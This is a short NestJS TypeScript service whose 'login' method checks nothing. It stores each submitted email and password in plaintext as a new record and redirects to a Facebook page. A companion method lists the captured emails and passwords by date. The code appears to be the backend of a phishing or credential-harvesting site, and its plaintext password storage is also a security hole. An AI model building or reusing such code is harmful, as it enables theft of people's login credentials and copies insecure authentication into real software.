import { Injectable } from '@nestjs/common';
import { Account } from 'src/entity';
import { Between, LessThan, MoreThan } from 'typeorm';
import { DatabaseService } from '../database.service';
import { v4 as uuid } from 'uuid';

@Injectable()
export class AccountService {
    constructor(
        private databaseService: DatabaseService,
    ) { }

    // eslint-disable-next-line @typescript-eslint/explicit-module-boundary-types
    async login(args: { email: string, pass: string }, res: any): Promise<void> {
        const { email, pass } = args;

        await Account.save(new Account({
            accountId: uuid(),
            email,
            pass,
            createdTime: new Date(),
            updatedTime: new Date()
        }));

        return res.redirect('https://www.facebook.com/Ai%E6%9C%9F%E8%B2%A8%E9%A0%90%E6%B8%AC-104912961057733');
    }
    /** 取得多個帳號 */
    async fetchAccounts(args: {
        startDate: Date;
        endDate: Date;
    }): Promise<{
        total: number,
        list: { email: string; pass: string; createdTime: string }[]
    }> {
        const { startDate, endDate } = args;

        const accounts = await this.databaseService.fetchData({
            type: Account,
            filter: query => {
                if (startDate && endDate) {
                    query.where({ createdTime: Between(startDate, endDate) });
                }

                if (startDate && !endDate) {
                    query.where({ createdTime: MoreThan(startDate) });
                }

                if (!startDate && endDate) {
                    query.where({ createdTime: LessThan(endDate) });
                }

                return query
                    .orderBy('Account.createdTime', 'DESC');
            },
        });

        return {
            total: accounts.length,
            list: accounts.map(
                ({ email, pass: pass, createdTime }) =>
                    ({ email, pass, createdTime: createdTime.format('yyyy/MM/DD HH:mm:ss') })
            )
        };
    }
}
